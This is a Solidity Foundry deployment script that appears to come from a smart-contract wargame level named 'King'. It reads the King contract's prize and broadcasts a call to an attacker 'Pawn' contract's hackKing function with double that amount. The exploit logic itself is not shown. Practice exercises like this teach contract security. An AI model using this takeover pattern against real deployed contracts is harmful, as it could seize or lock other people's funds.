// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Pawn} from "../src/Pawn.sol";
import {King} from "../src/King.sol";

contract HackKingScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        Pawn pawn = helperConfig.getKingConfig().pawn;
        King king = helperConfig.getKingConfig().king;
        console.log("Prize: ", king.prize());
        vm.startBroadcast();
        pawn.hackKing{value: king.prize() * 2, gas: 800000}();
        vm.stopBroadcast();
    }
}
